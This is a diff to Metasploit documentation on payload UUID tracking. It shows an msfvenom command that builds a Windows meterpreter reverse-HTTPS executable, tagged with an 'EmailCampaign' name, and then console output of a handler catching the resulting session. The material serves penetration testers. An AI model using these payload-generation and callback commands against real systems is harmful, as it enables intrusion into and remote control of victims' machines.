@@ -23,19 +23,40 @@ Payload UUIDs are enabled by default, but are not tracked unless the ```PayloadU
 ```
 $ ./msfvenom -p windows/meterpreter/reverse_https LHOST=example.com LPORT=4444 PayloadUUIDTracking=true PayloadUUIDName=EmailCampaign20150101 -f exe -o payload.exe
 
-$ cat ~/.msf4/payloads.json 
+$ cat ~/.msf4/payloads.json
 {
-  "09e642e7c0fc235a": {
+  "68017d72958c40f6": {
     "arch": "x86",
     "platform": "windows",
-    "timestamp": 1435276808,
+    "timestamp": 1435277049,
     "payload": "payload/windows/meterpreter/reverse_https",
-    "datastore": {"AutoLoadStdapi":true,"AutoRunScript":"","AutoSystemInfo":true,"AutoVerifySession":true,"AutoVerifySessionTimeout":30,"EXITFUNC":"process","EnableStageEncoding":false,"EnableUnicodeEncoding":false,"HttpUnknownRequestResponse":"\u003Chtml\u003E\u003Cbody\u003E\u003Ch1\u003EIt works!\u003C/h1\u003E\u003C/body\u003E\u003C/html\u003E","IgnoreUnknownPayloads":false,"InitialAutoRunScript":"","LHOST":"example.com","LPORT":4444,"MeterpreterServerName":"Apache","MeterpreterUserAgent":"Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)","OverrideRequestHost":false,"PAYLOADUUIDNAME":"EmailCampaign20150101","PayloadProxyPort":0,"PayloadProxyType":"HTTP","PayloadUUIDTracking":true,"PrependMigrate":false,"ReverseListenerBindPort":0,"SessionCommunicationTimeout":300,"SessionExpirationTimeout":604800,"SessionRetryTotal":3600,"SessionRetryWait":10,"StageEncoderSaveRegisters":"","StageEncodingFallback":true,"StagerRetryCount":10,"StagerURILength":0,"StagerVerifySSLCert":false,"VERBOSE":false},
+    "datastore": {"AutoLoadStdapi":true,"AutoRunScript":"","AutoSystemInfo":true,"AutoVerifySession":true,"AutoVerifySessionTimeout":30,"EXITFUNC":"process","EnableStageEncoding":false,"EnableUnicodeEncoding":false,"HttpUnknownRequestResponse":"\u003Chtml\u003E\u003Cbody\u003E\u003Ch1\u003EIt works!\u003C/h1\u003E\u003C/body\u003E\u003C/html\u003E","IgnoreUnknownPayloads":false,"InitialAutoRunScript":"","LHOST":"127.1.1.1","LPORT":4444,"MeterpreterServerName":"Apache","MeterpreterUserAgent":"Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)","OverrideRequestHost":false,"PAYLOADUUIDNAME":"EmailCampaign20150101","PayloadProxyPort":0,"PayloadProxyType":"HTTP","PayloadUUIDTracking":true,"PrependMigrate":false,"ReverseListenerBindPort":0,"SessionCommunicationTimeout":300,"SessionExpirationTimeout":604800,"SessionRetryTotal":3600,"SessionRetryWait":10,"StageEncoderSaveRegisters":"","StageEncodingFallback":true,"StagerRetryCount":10,"StagerURILength":0,"StagerVerifySSLCert":false,"VERBOSE":false},
     "name": "EmailCampaign20150101",
     "urls": [
-  "/CeZC58D8I1qT_JL9xnAF9A7AvWT8e_QNB3MWqY8nvNRN82crZWqoXKr25Ej7XR87IbnnwUwC2bwG9LIIh1tVUTMf1fwag0F7m6mk0iv-u4M9h40elV0aPD7d3genb1ofVEwKV-L2SXG-DYXJnkiH7gPeA_rCTHHfAn-Ayl2ETblQp5lVH-12tZjVIFGWVfFEDMWYnAKBzKmb4jMcrdTQP2u_fM"
+  "/aAF9cpWMQPb-3f_cq1FoJA040uMw26kAnvroJdztpVzDrNpqbpT7t3DyYy0cR2TyQE87XxHgIOKiYwP2FJNlNjrBXWQNiGWtzUK1ueJ0DyFjCXmULVo_gGrvi"
 ]
 }
 }
 ```
 
+Once this payload is launched, the output of the ```sessions -l -v``` command will show the UUID, whether or not the UUID is registered, and any locally-assigned name of the UUID:
+```
+msf exploit(handler) > run -j
+[*] 127.0.0.1:36235 (UUID: 68017d72958c40f6/x86=1/windows=1/2015-06-26T00:04:09Z) Staging Native payload ...
+[*] Meterpreter session 1 opened (127.1.1.1:4444 -> 127.0.0.1:36235) at 2015-06-25 17:12:40 -0700
+
+msf exploit(handler) > sessions  -l -v
+
+Active sessions
+===============
+
+  Session ID: 1
+        Type: meterpreter x86/win32
+        Info: fang\hdm @ fang
+      Tunnel: 127.1.1.1:4444 -> 127.0.0.1:36235 (127.0.0.1)
+         Via: exploit/multi/handler
+        UUID: 68017d72958c40f6/x86=1/windows=1/2015-06-26T00:04:09Z
+   MachineID: 1fd541d2c4278e2d0c1b02f17f142f2b
+     CheckIn: 1s ago @ 2015-06-25 17:12:47 -0700
+  Registered: Yes - Name="EmailCampaign20150101"
+```
